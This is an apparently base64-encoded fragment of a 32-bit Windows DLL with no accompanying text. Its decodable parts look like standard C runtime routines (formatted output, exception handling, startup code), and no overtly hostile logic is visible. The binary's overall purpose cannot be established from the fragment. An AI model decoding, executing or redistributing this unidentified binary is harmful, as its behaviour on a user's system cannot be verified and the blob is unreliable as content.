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CLvbz9//8PvrzHOBEBEIvHwfgEib28/f//i73k/f//iYW8/f//g/gHD4eHCQAA/ySFJp0AEDPAg43Y/f///4vYiYWg/f//iYW4/f//iYXI/f//iYXM/f//iZ3o/f//iYXE/f//6UwJAAAPvsGD6CB0RoPoA3Q5g+gIdC9ISHQdg+gDi4Xw/f//D4UtCQAAg8sIiZ3o/f//6R8JAACDywSJnej9///pCwkAAIPLAevwgcuAAAAA6+iDywLr44D5KnUviweDxwSJveT9//+Jhcj9//+FwA+J2wgAAIPLBPfYiZ3o/f//iYXI/f//6cUIAACLhcj9//9rwAqJhcj9//8PvsGLjcj9//+DwdADyImNyP3//+mdCAAAM8CJhdj9///pkAgAAID5KnUriweDxwSJhdj9//+FwIuF8P3//4m95P3//w+JcggAAION2P3////pZggAAIuV2P3//2vSCg++wYPC0APQiZXY/f//6T4IAACA+Ul0RYD5aHQ4i4Xw/f//gPlsdBSA+XcPhSwIAACBywAIAADp9/7//4A4bHUMQIHLABAAAOnm/v//g8sQ6d7+//+DyyDp5P7//4uF8P3//4oAPDZ1HIu98P3//4B/ATR1EIvHg8ACgcsAgAAA6a7+//88M3Uci73w/f//gH8BMnUQi8eDwAKB4/9////pjv7//zxkD4SqBwAAPGkPhKIHAAA8bw+EmgcAADx1D4SSBwAAPHgPhIoHAAA8WA+EggcAADPAiYW8/f//6wIzwImFxP3//42FiP3//1APtsFQ6AA2AABZWYXAdDiNheD9//9Q/7XQ/f///7W0/f//6LkHAACLjfD9//+DxAyKAUGIhbT9//+JjfD9//+EwA+EYgcAAI2F4P3//1D/tdD9////tbT9///ogQcAAIPEDOn8BgAAD77Bg/hkD4/NAQAAD4RRAgAAg/hTD4/tAAAAdHyD6EF0EEhIdFZISHQISEgPhRgFAACAwSDHhaD9//8BAAAAiI3v/f//i4XY/f//g8tAugACAACJnej9//+NtfT9//+JlcD9//+FwA+JMgIAAMeF2P3//wYAAADpgAIAAPfDMAgAAA+FngAAAIHLAAgAAImd6P3//+mNAAAA98MwCAAAdQyBywAIAACJnej9//+Lldj9//+5////f4P6/3QCi8qLN4PHBIm95P3///fDEAgAAA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